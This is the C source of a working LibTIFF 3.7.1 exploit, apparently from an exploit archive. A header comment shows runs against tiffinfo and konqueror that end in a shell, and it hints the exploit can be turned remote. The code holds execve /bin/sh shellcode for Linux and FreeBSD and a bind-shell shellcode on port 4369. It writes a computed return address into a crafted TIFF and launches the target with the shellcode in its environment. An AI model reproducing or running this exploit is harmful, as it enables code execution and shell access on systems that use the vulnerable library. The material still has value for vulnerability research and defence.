/*
 LibTIFF exploit
 Tested on LibTIFF 3.7.1
 Coded by Agustin Gianni (agustingianni at gmail.com) and Samelat

 Blog: http://gruba.blogspot.com
  
 In other versions and/or Linux distributions you might need to
 adjust some offsets.

 gr00vy@kenny:/home/gr00vy/EXPLOIT$ make libtiff_exploit
 cc libtiff_exploit.c -o libtiff_exploit
 gr00vy@kenny:/home/gr00vy/EXPLOIT$ ./libtiff_exploit /usr/local/bin/tiffinfo evil.tiff
 Using RET: 0xbfffffb4
 TIFFReadDirectory:
 Warning, evil.tiff: unknown field with tag 260 (0x104) encountered.
 evil.tiff:
 Warning, incorrect count for field "PhotometricInterpretation" (150341633, expecting 1); tag trimmed.
 evil.tiff:
 Warning, incorrect count for field "BitsPerSample" (257, expecting 1); tag trimmed.
 sh-3.00$

 gr00vy@kenny:/home/gr00vy/storage/Exploits/Libtiff-3.7.1$ ./libtiff_exploit
 /usr/kde/3.3/bin/konqueror evil.tiff
 Linux Enabled
 Using RET: 0xbfffffb1
 konqueror: ERROR: Error in BrowserExtension::actionSlotMap(), unknown action : searchProvider
 konqueror: ERROR: Error in BrowserExtension::actionSlotMap(), unknown action : searchProvider
 TIFFReadDirectory: Warning, : unknown field with tag 260 (0x104) encountered.
 : Warning, incorrect count for field "PhotometricInterpretation" (150341633, expecting 1);
 tag
 trimmed.
 : Warning, incorrect count for field "BitsPerSample" (257, expecting 1); tag trimmed.
 sh-3.00$ exit
 exit

 Heheh it also works like a remote exploit i would leave that work (easy work) for the
 "interested" people.

*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define OFFSET 0x3F /* return address offset */
#define SHELL_OFFSET 0x0102 /* shellcode address offset */
#define DISPLAY "DISPLAY=:0.0" /* no comments ... */
#define HOMEDIR "HOME=/tmp/"

int
main(int argc, char **argv, char **env)
{
 /* Linux shellcode that binds a shell on port 4369 */
char linux_bind[] = "\x31\xc0\x50\x40\x50\x40\x50\xb0\x66\x31"
  "\xdb\x43\x89\xe1\xcd\x80\x99\x52\x52\x52"
  "\xba\x02\x01\x11\x11\xfe\xce\x52\x89\xe2"
  "\x31\xc9\xb1\x10\x51\x52\x50\x89\xc2\x89"
  "\xe1\xb0\x66\xb3\x02\x89\xe1\xcd\x80\xb0"
  "\x66\xb3\x04\x53\x52\x89\xe1\xcd\x80\x31"
  "\xc0\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05"
  "\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xb0\x3f"
  "\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f"
  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

 /* (?) lies lies lies lies!*/
 #ifdef FREEBSD
 printf("FreeBSD Enabled\n");
 char shellcode[]=
  "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd"
  "\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";
 
 #else
 printf("Linux Enabled\n");
 char shellcode[] =
  "\xeb\x20\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c"
  "\x88\x46\x07\x8d\x56\x0c\x8d\x4e\x08\x89\xf3"
  "\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd"
  "\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f"
  "\x73\x68\x23";
 
 #endif

 if(argc < 3)
 {
  fprintf(stderr, "Error, arguments are like these\n"
    "%s <path_to_vuln> <eviltiff.tiff>\n", argv[0]);
  return -1;
 }
 
 char *envp[] = {HOMEDIR, DISPLAY, shellcode, NULL};
 
 /* argv[1] -> executable file that is linked with vuln tiff library */
 long ret = 0xc0000000 - sizeof(void *) - strlen(argv[1]) - strlen(shellcode) - 0x02;
 
 int fd = open(argv[2], O_RDWR);
 if(fd == -1)
 {
  perror("open()");
  return -1;
 }
 
 if(lseek(fd, OFFSET, SEEK_SET) == -1)
 {
  perror("lseek()");
  close(fd);
  return -1;
 }
 
 if(write(fd, (void *) &ret, sizeof(long)) < sizeof(long))
 {
  perror("write()");
  close(fd);
  return -1;
 }
 
 close(fd);
 
 fprintf(stdout, "Using RET: 0x%.8x\n", (unsigned int) ret);
 
 if(execle(argv[1], "tiff", argv[2], NULL, envp) == -1)
 {
  perror("execve()");
  return -1;
 }
 
 return 0;
}

// milw0rm.com [2006-03-05]